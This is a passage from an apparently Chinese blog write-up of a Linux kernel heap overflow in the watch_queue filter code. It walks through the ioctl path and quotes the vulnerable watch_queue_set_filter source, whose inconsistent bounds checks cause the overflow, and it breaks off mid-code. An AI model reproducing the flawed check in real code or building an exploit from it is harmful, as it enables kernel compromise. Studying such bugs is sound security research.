    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>其实前两天复现了一个2023的CVE，本来打算写那一个的，但是对于那个CVE更多的是做工作上的适配，在一些小细节上的原理并没有掌握得特别透彻，并且因为是刚刚公开的一个CVE也导致没有更多的文章进行参考，等后面进一步分析一下源码再写。</p><p>此次的CVE是存在于观察队列事件通知子系统 (watch_queue event notification subsystem) 中的一个堆溢出漏洞，该漏洞从内核版本5.8伴随着 watch queue subsystem 引入，在 5.17-rc4 得到修复。</p><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><p>通用通知机制是建立在标准管道驱动之上的，其可以有效地将来自内核的通知消息拼接到用户打开的管道中，我们可以通过 <code>CONFIG_WATCH_QUEUE</code> 编译选项启用（默认开启）</p><p>该机制通过一个以特殊模式打开的管道实现，内核生成的消息被保存到管道内部的循环环形缓冲区中（<code>pipe_buffer</code> 队列），通过 <code>read()</code> 进行读取，由于在某些情况下我们可能想要将添加的内容还原到环上，因此在此类管道上禁用了 splice 以及类似功能（因为这可能导致其与通知消息交织在一起）</p><p>管道的所有者应当告诉内核哪些资源其想要通过该管道进行观察，只有连接到该管道上的资源才会往里边插入消息，需要注意的是一个资源可能会与多个管道绑定并同时将消息插入所有管道</p><p>若环中没有可用的插槽或可用的预分配的 message buffer（一个管道默认只有 16 个 <code>pipe_buffer</code> ——对应 16 张内存页），则消息将会被丢弃，在这两种情况下，<code>read()</code> 将在读取当前缓冲区的最后一条消息后将 <code>WATCH_META_LOSS_NOTIFICATION</code> 插入输出缓冲区。</p><h3 id="Watch-Queue-API"><a href="#Watch-Queue-API" class="headerlink" title="Watch Queue API"></a>Watch Queue API</h3><p>一个观测队列（watch queue）是由一个应用分配的用以记录通知的缓冲区，其工作原理完全隐藏在管道设备驱动中，但有必要获得一个对其的引用以设置一个观测，可以通过以下 API 进行管理：</p><ul><li><p><code>struct watch_queue *get_watch_queue(int fd);</code></p><p>由于观测队列在内核中通过实现缓冲区的管道的文件描述符表示，用户空间必须通过系统调用传递该文件描述符，这可以用于从系统调用中查找指向观测队列的不透明指针</p></li><li><p><code>void put_watch_queue(struct watch_queue *wqueue);</code></p><p>该函数用以丢弃从 <code>get_watch_queue()</code> 获得的引用</p></li></ul><h3 id="Event-Filter"><a href="#Event-Filter" class="headerlink" title="Event Filter"></a>Event Filter</h3><p>当一个观测队列被创建后，我们可以使用过滤器限制接收的事件：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">watch_notification_filter</span> &#123;</span></span><br><span class="line">__u32nr_filters;<span class="comment">/* Number of filters */</span></span><br><span class="line">__u32__reserved;<span class="comment">/* Must be 0 */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">watch_notification_type_filter</span> <span class="title">filters</span>[];</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">watch_notification_filter</span> <span class="title">filter</span> =</span> &#123;</span><br><span class="line">        ...</span><br><span class="line">&#125;;</span><br><span class="line">ioctl(fd, IOC_WATCH_QUEUE_SET_FILTER, &amp;filter)</span><br></pre></td></tr></table></figure><p>这里主要解释一下结构体中的成员的含义，<code>nr_filters</code>成员表示的是<code>filters[]</code>数组中过滤器的数量，而可以看出来<code>__reserved</code>是必须置0的。需要注意的是其中<code>filters[]</code>数组的类型为<code>watch_notification_type_filter</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">watch_notification_type_filter</span> &#123;</span></span><br><span class="line">__u32type;<span class="comment">/* Type to apply filter to */</span></span><br><span class="line">__u32info_filter;<span class="comment">/* Filter on watch_notification::info */</span></span><br><span class="line">__u32info_mask;<span class="comment">/* Mask of relevant bits in info_filter */</span></span><br><span class="line">__u32subtype_filter[<span class="number">8</span>];<span class="comment">/* Bitmask of subtypes to filter on */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这里也是简单介绍一下其中的结构体的含义，首先是<code>type</code>代表的是需要过滤事件的类型：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">watch_notification_type</span> &#123;</span></span><br><span class="line">WATCH_TYPE_META= <span class="number">0</span>,<span class="comment">/* Special record */</span></span><br><span class="line">WATCH_TYPE_KEY_NOTIFY= <span class="number">1</span>,<span class="comment">/* Key change event notification */</span></span><br><span class="line">WATCH_TYPE__NR= <span class="number">2</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>info_filter</code>成员与<code>info_mask</code>成员充当的是通知记录的信息字段的过滤器，仅当如下情况才会将通知写入缓冲区：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(watch.info &amp; info_mask) == info_filter</span><br></pre></td></tr></table></figure><p><code>subtype_filter</code>成员则是指示我们感兴趣的字类型的<code>bitmask</code>，<code>subtype_filter[0]</code>的0位对应子类型0，1位对应子类型1…</p><p>若是上面使用<code>ioctl(fd, IOC_WATCH_QUEUE_SET_FILTER, NULL)</code>则为移出过滤器，此时接受所有来自观测的信息。</p><h3 id="watch-queue-subsystem-中-Event-Filter-实现"><a href="#watch-queue-subsystem-中-Event-Filter-实现" class="headerlink" title="watch queue subsystem 中 Event Filter 实现"></a>watch queue subsystem 中 Event Filter 实现</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL_DEFINE3(ioctl, <span class="keyword">unsigned</span> <span class="keyword">int</span>, fd, <span class="keyword">unsigned</span> <span class="keyword">int</span>, cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span>, arg)</span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fd</span> <span class="title">f</span> =</span> fdget(fd);</span><br><span class="line"><span class="keyword">int</span> error;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!f.file)</span><br><span class="line"><span class="keyword">return</span> -EBADF;</span><br><span class="line"></span><br><span class="line">error = security_file_ioctl(f.file, cmd, arg);</span><br><span class="line"><span class="keyword">if</span> (error)</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">error = do_vfs_ioctl(f.file, fd, cmd, arg);</span><br><span class="line"><span class="keyword">if</span> (error == -ENOIOCTLCMD)</span><br><span class="line">error = vfs_ioctl(f.file, cmd, arg);</span><br><span class="line"></span><br><span class="line">out:</span><br><span class="line">fdput(f);</span><br><span class="line"><span class="keyword">return</span> error;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先则是我们调用<code>ioctl</code>是会进入如上函数，并且通过验证之后最终会调用到<code>do_vfs_ioctl</code>函数，而这个函数内部就是一个硕大<code>switch</code>语句根据cmd进行处理，但是<code>IOC_WATCH_QUEUE_SET_FILTER</code>并不在其中，所以最终会调用到<code>vfs_ioctl</code>函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">vfs_ioctl</span><span class="params">(struct file *filp, <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> error = -ENOTTY;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!filp-&gt;f_op-&gt;unlocked_ioctl)</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">error = filp-&gt;f_op-&gt;unlocked_ioctl(filp, cmd, arg);</span><br><span class="line"><span class="keyword">if</span> (error == -ENOIOCTLCMD)</span><br><span class="line">error = -ENOTTY;</span><br><span class="line"> out:</span><br><span class="line"><span class="keyword">return</span> error;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(vfs_ioctl);</span><br></pre></td></tr></table></figure><p>可以注意到的事这里其实调用的是<code>filp-&gt;f_op-&gt;unlocked_ioctl</code>函数，所以首要就是要搞明白这是个什么函数。</p><p>前文提到，通知机制是建立在管道上面的，所以这里文件描述符其实也就是管道的，那么我们当前则需要更多的将目光放在管道的创建上面，而管道的创建存在以下调用关系：<code>do_pipe2() =&gt; __do_pipe_flags() =&gt; create_pipe_files() =&gt; alloc_file_pseudo() =&gt; alloc_file()</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> struct file *<span class="title">alloc_file</span><span class="params">(<span class="keyword">const</span> struct path *path, <span class="keyword">int</span> flags,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">const</span> struct file_operations *fop)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">file</span>;</span></span><br><span class="line"></span><br><span class="line">file = alloc_empty_file(flags, current_cred());</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(file))</span><br><span class="line"><span class="keyword">return</span> file;</span><br><span class="line"></span><br><span class="line">file-&gt;f_path = *path;</span><br><span class="line">file-&gt;f_inode = path-&gt;dentry-&gt;d_inode;</span><br><span class="line">file-&gt;f_mapping = path-&gt;dentry-&gt;d_inode-&gt;i_mapping;</span><br><span class="line">file-&gt;f_wb_err = filemap_sample_wb_err(file-&gt;f_mapping);</span><br><span class="line">file-&gt;f_sb_err = file_sample_sb_err(file);</span><br><span class="line"><span class="keyword">if</span> ((file-&gt;f_mode &amp; FMODE_READ) &amp;&amp;</span><br><span class="line">     likely(fop-&gt;read || fop-&gt;read_iter))</span><br><span class="line">file-&gt;f_mode |= FMODE_CAN_READ;</span><br><span class="line"><span class="keyword">if</span> ((file-&gt;f_mode &amp; FMODE_WRITE) &amp;&amp;</span><br><span class="line">     likely(fop-&gt;write || fop-&gt;write_iter))</span><br><span class="line">file-&gt;f_mode |= FMODE_CAN_WRITE;</span><br><span class="line">file-&gt;f_mode |= FMODE_OPENED;</span><br><span class="line">file-&gt;f_op = fop;</span><br><span class="line"><span class="keyword">if</span> ((file-&gt;f_mode &amp; (FMODE_READ | FMODE_WRITE)) == FMODE_READ)</span><br><span class="line">i_readcount_inc(path-&gt;dentry-&gt;d_inode);</span><br><span class="line"><span class="keyword">return</span> file;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到的是这里对于ops的赋值是发生在这个位置的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">create_pipe_files</span><span class="params">(struct file **res, <span class="keyword">int</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">inode</span> =</span> get_pipe_inode();</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">f</span>;</span></span><br><span class="line"><span class="keyword">int</span> error;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!inode)</span><br><span class="line"><span class="keyword">return</span> -ENFILE;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (flags &amp; O_NOTIFICATION_PIPE) &#123;</span><br><span class="line">error = watch_queue_init(inode-&gt;i_pipe);</span><br><span class="line"><span class="keyword">if</span> (error) &#123;</span><br><span class="line">free_pipe_info(inode-&gt;i_pipe);</span><br><span class="line">iput(inode);</span><br><span class="line"><span class="keyword">return</span> error;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">f = alloc_file_pseudo(inode, pipe_mnt, <span class="string">&quot;&quot;</span>,</span><br><span class="line">O_WRONLY | (flags &amp; (O_NONBLOCK | O_DIRECT)),</span><br><span class="line">&amp;pipefifo_fops);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(f)) &#123;</span><br><span class="line">free_pipe_info(inode-&gt;i_pipe);</span><br><span class="line">iput(inode);</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(f);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">f-&gt;private_data = inode-&gt;i_pipe;</span><br><span class="line"></span><br><span class="line">res[<span class="number">0</span>] = alloc_file_clone(f, O_RDONLY | (flags &amp; O_NONBLOCK),</span><br><span class="line">  &amp;pipefifo_fops);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(res[<span class="number">0</span>])) &#123;</span><br><span class="line">put_pipe_info(inode, inode-&gt;i_pipe);</span><br><span class="line">fput(f);</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(res[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line">res[<span class="number">0</span>]-&gt;private_data = inode-&gt;i_pipe;</span><br><span class="line">res[<span class="number">1</span>] = f;</span><br><span class="line">stream_open(inode, res[<span class="number">0</span>]);</span><br><span class="line">stream_open(inode, res[<span class="number">1</span>]);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然而真正传入ops的是这个函数内部中，可以看到ops其实就是<code>pipefifo_fops</code>变量。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">pipefifo_fops</span> =</span> &#123;</span><br><span class="line">.open= fifo_open,</span><br><span class="line">.llseek= no_llseek,</span><br><span class="line">.read_iter= pipe_read,</span><br><span class="line">.write_iter= pipe_write,</span><br><span class="line">.poll= pipe_poll,</span><br><span class="line">.unlocked_ioctl= pipe_ioctl,</span><br><span class="line">.release= pipe_release,</span><br><span class="line">.fasync= pipe_fasync,</span><br><span class="line">.splice_write= iter_file_splice_write,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>可以看到<code>unlocked_ioctl</code>对应的也就是<code>pipe_ioctl函数</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">long</span> <span class="title">pipe_ioctl</span><span class="params">(struct file *filp, <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> *<span class="title">pipe</span> =</span> filp-&gt;private_data;</span><br><span class="line"><span class="keyword">int</span> count, head, tail, mask;</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (cmd) &#123;</span><br><span class="line"><span class="keyword">case</span> FIONREAD:</span><br><span class="line">__pipe_lock(pipe);</span><br><span class="line">count = <span class="number">0</span>;</span><br><span class="line">head = pipe-&gt;head;</span><br><span class="line">tail = pipe-&gt;tail;</span><br><span class="line">mask = pipe-&gt;ring_size - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (tail != head) &#123;</span><br><span class="line">count += pipe-&gt;bufs[tail &amp; mask].len;</span><br><span class="line">tail++;</span><br><span class="line">&#125;</span><br><span class="line">__pipe_unlock(pipe);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> put_user(count, (<span class="keyword">int</span> __user *)arg);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_WATCH_QUEUE</span></span><br><span class="line"><span class="keyword">case</span> IOC_WATCH_QUEUE_SET_SIZE: &#123;</span><br><span class="line"><span class="keyword">int</span> ret;</span><br><span class="line">__pipe_lock(pipe);</span><br><span class="line">ret = watch_queue_set_size(pipe, arg);</span><br><span class="line">__pipe_unlock(pipe);</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> IOC_WATCH_QUEUE_SET_FILTER:</span><br><span class="line"><span class="keyword">return</span> watch_queue_set_filter(</span><br><span class="line">pipe, (struct watch_notification_filter __user *)arg);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">return</span> -ENOIOCTLCMD;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而在函数内部其实也就是个大的<code>switch</code>语句，并且在最后有一个处理<code>watch_queue_set_filter</code>函数，而漏洞正发生在其中。</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="漏洞点一"><a href="#漏洞点一" class="headerlink" title="漏洞点一"></a>漏洞点一</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">watch_queue_set_filter</span><span class="params">(struct pipe_inode_info *pipe,</span></span></span><br><span class="line"><span class="params"><span class="function">    struct watch_notification_filter __user *_filter)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">watch_notification_type_filter</span> *<span class="title">tf</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">watch_notification_filter</span> <span class="title">filter</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">watch_type_filter</span> *<span class="title">q</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">watch_filter</span> *<span class="title">wfilter</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">watch_queue</span> *<span class="title">wqueue</span> =</span> pipe-&gt;watch_queue;</span><br><span class="line"><span class="keyword">int</span> ret, nr_filter = <span class="number">0</span>, i;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!wqueue)</span><br><span class="line"><span class="keyword">return</span> -ENODEV;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!_filter) &#123;</span><br><span class="line"><span class="comment">/* Remove the old filter */</span></span><br><span class="line">wfilter = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">goto</span> <span class="built_in">set</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Grab the user&#x27;s filter specification */</span></span><br><span class="line"><span class="keyword">if</span> (copy_from_user(&amp;filter, _filter, <span class="keyword">sizeof</span>(filter)) != <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> -EFAULT;</span><br><span class="line"><span class="keyword">if</span> (filter.nr_filters == <span class="number">0</span> ||</span><br><span class="line">    filter.nr_filters &gt; <span class="number">16</span> ||</span><br><span class="line">    filter.__reserved != <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">tf = memdup_user(_filter-&gt;filters, filter.nr_filters * <span class="keyword">sizeof</span>(*tf));</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(tf))</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(tf);</span><br><span class="line"></span><br><span class="line">ret = -EINVAL;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; filter.nr_filters; i++) &#123;</span><br><span class="line"><span class="keyword">if</span> ((tf[i].info_filter &amp; ~tf[i].info_mask) ||</span><br><span class="line">    tf[i].info_mask &amp; WATCH_INFO_LENGTH)</span><br><span class="line"><span class="keyword">goto</span> err_filter;</span><br><span class="line"><span class="comment">/* Ignore any unknown types */</span></span><br><span class="line"><span class="keyword">if</span> (tf[i].type &gt;= <span class="keyword">sizeof</span>(wfilter-&gt;type_filter) * <span class="number">8</span>)</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">nr_filter++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Now we need to build the internal filter from only the relevant</span></span><br><span class="line"><span class="comment"> * user-specified filters.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">ret = -ENOMEM;</span><br><span class="line">wfilter = kzalloc(struct_size(wfilter, filters, nr_filter), GFP_KERNEL);</span><br><span class="line"><span class="keyword">if</span> (!wfilter)</span><br><span class="line"><span class="keyword">goto</span> err_filter;</span><br><span class="line">wfilter-&gt;nr_filters = nr_filter;</span><br><span class="line"></span><br><span class="line">q = wfilter-&gt;filters;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; filter.nr_filters; i++) &#123;</span><br><span class="line"><span class="keyword">if</span> (tf[i].type &gt;= <span class="keyword">sizeof</span>(wfilter-&gt;type_filter) * BITS_PER_LONG)</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">q-&gt;type= tf[i].type;</span><br><span class="line">q-&gt;info_filter= tf[i].info_filter;</span><br><span class="line">q-&gt;info_mask= tf[i].info_mask;</span><br><span class="line">q-&gt;subtype_filter[<span class="number">0</span>]= tf[i].subtype_filter[<span class="number">0</span>];</span><br><span class="line">__set_bit(q-&gt;type, wfilter-&gt;type_filter);</span><br><span class="line">q++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">kfree(tf);</span><br><span class="line"><span class="built_in">set</span>:</span><br><span class="line">pipe_lock(pipe);</span><br><span class="line">wfilter = rcu_replace_pointer(wqueue-&gt;filter, wfilter,</span><br><span class="line">      lockdep_is_held(&amp;pipe-&gt;mutex));</span><br><span class="line">pipe_unlock(pipe);</span><br><span class="line"><span class="keyword">if</span> (wfilter)</span><br><span class="line">kfree_rcu(wfilter, rcu);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">err_filter:</span><br><span class="line">kfree(tf);</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先则是将用户空间的<code>_filter</code>拷贝到内核中，接着就是对结构体中的<code>nr_filters</code>和<code>__reservede</code>成员进行验证。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (copy_from_user(&amp;filter, _filter, <span class="keyword">sizeof</span>(filter)) != <span class="number">0</span>)</span><br><span class="line">  <span class="keyword">return</span> -EFAULT;</span><br><span class="line"><span class="keyword">if</span> (filter.nr_filters == <span class="number">0</span> ||</span><br><span class="line">    filter.nr_filters &gt; <span class="number">16</span> ||</span><br><span class="line">    filter.__reserved != <span class="number">0</span>)</span><br><span class="line">  <span class="keyword">return</span> -EINVAL;</span><br></pre></td></tr></table></figure><p>接下来通过<code>memdup_user</code>函数将用户态<code>struct watch_notification_type_filter filters[]</code>数组放到临时的内存空间<code>tf</code>中。紧接着将根据<code>filter.nr_filters</code>进行for循环，并对<code>tf</code>中的内容进行校验。待都通过则会根据<code>struct_size(wfilter, filters, nr_filter)</code>生成一个<code>object</code>，而这个宏定义的含义其实是<code>sizeof(wfilter) + sizeof(filters) * nr_filter</code>。并且需要注意的是这里<code>nr_filter</code>并不是任何结构体中的成员，只是函数声明的一个局部变量</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; filter.nr_filters; i++) &#123;</span><br><span class="line">  <span class="keyword">if</span> (tf[i].type &gt;= <span class="keyword">sizeof</span>(wfilter-&gt;type_filter) * BITS_PER_LONG)</span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">  q-&gt;type= tf[i].type;</span><br><span class="line">  q-&gt;info_filter= tf[i].info_filter;</span><br><span class="line">  q-&gt;info_mask= tf[i].info_mask;</span><br><span class="line">  q-&gt;subtype_filter[<span class="number">0</span>]= tf[i].subtype_filter[<span 